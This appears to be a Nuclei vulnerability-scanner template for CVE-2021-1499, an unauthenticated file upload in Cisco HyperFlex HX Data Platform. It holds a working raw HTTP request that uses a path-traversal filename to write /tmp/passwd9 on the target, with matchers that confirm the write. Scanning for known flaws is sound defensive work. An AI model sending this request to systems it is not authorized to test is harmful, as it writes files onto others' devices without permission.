id: CVE-2021-1499
info:
  author: gy741
  classification:
    cve-id: CVE-2021-1499
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
    cvss-score: 5.3
    cwe-id: CWE-306
  description: A vulnerability in the web-based management interface of Cisco HyperFlex
    HX Data Platform could allow an unauthenticated, remote attacker to upload files
    to an affected device. This vulnerability is due to missing authentication for
    the upload function. An attacker could exploit this vulnerability by sending a
    specific HTTP request to an affected device. A successful exploit could allow
    the attacker to upload files to the affected device with the permissions of the
    tomcat8 user.
  name: Cisco HyperFlex HX Data Platform - File Upload Vulnerability
  reference:
  - https://swarm.ptsecurity.com/cisco-hyperflex-how-we-got-rce-through-login-form-and-other-findings/
  - https://nvd.nist.gov/vuln/detail/CVE-2021-1499
  - https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-hyperflex-upload-KtCK8Ugz
  - http://packetstormsecurity.com/files/163203/Cisco-HyperFlex-HX-Data-Platform-File-Upload-Remote-Code-Execution.html
  severity: medium
  tags: cve,cve2021,cisco,fileupload,intrusive
requests:
- matchers:
  - status:
    - 200
    type: status
  - part: header
    type: word
    words:
    - application/json
  - condition: and
    type: word
    words:
    - '{"result":'
    - '"filename:'
    - /tmp/passwd9
  matchers-condition: and
  raw:
  - 'POST /upload HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    Accept-Encoding: gzip, deflate

    Content-Type: multipart/form-data; boundary=---------------------------253855577425106594691130420583

    Origin: {{RootURL}}

    Referer: {{RootURL}}


    -----------------------------253855577425106594691130420583

    Content-Disposition: form-data; name="file"; filename="../../../../../tmp/passwd9"

    Content-Type: application/json


    MyPasswdNewData->/api/tomcat


    -----------------------------253855577425106594691130420583--

    '
